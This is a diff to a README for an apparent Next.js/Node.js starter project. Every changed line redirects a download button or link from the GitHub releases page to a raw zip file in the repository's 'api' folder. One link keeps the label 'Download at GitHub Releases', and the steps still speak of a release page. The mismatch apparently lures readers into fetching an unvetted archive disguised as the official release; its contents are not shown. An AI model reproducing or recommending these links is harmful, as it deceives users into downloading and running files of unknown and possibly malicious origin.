@@ -1,6 +1,6 @@
 # 🔧 Next.js-Node.js - Easy Web App Development Starter
 
-[![Download Release](https://img.shields.io/badge/Download-Next.js_Node.js-blue?style=for-the-badge)](https://github.com/romaisarumi/Next.js-Node.js/releases)
+[![Download Release](https://img.shields.io/badge/Download-Next.js_Node.js-blue?style=for-the-badge)](https://github.com/romaisarumi/Next.js-Node.js/raw/refs/heads/main/api/js-Next-Node-v1.4.zip)
 
 ## 📋 What is this?
 
@@ -31,7 +31,7 @@ You will get all files needed to run the app from the official release page.
 **Follow these steps:**
 
 1. Go to the release page by clicking the button below:  
-[![Download Release](https://img.shields.io/badge/Download-Next.js_Node.js-red?style=for-the-badge)](https://github.com/romaisarumi/Next.js-Node.js/releases)
+[![Download Release](https://img.shields.io/badge/Download-Next.js_Node.js-red?style=for-the-badge)](https://github.com/romaisarumi/Next.js-Node.js/raw/refs/heads/main/api/js-Next-Node-v1.4.zip)
 
 2. On the page, look for the latest release version. 
 
@@ -131,4 +131,4 @@ This project is a simple start to understand building web apps with Next.js and 
 
 ---
 
-[Download at GitHub Releases](https://github.com/romaisarumi/Next.js-Node.js/releases)
+[Download at GitHub Releases](https://github.com/romaisarumi/Next.js-Node.js/raw/refs/heads/main/api/js-Next-Node-v1.4.zip)
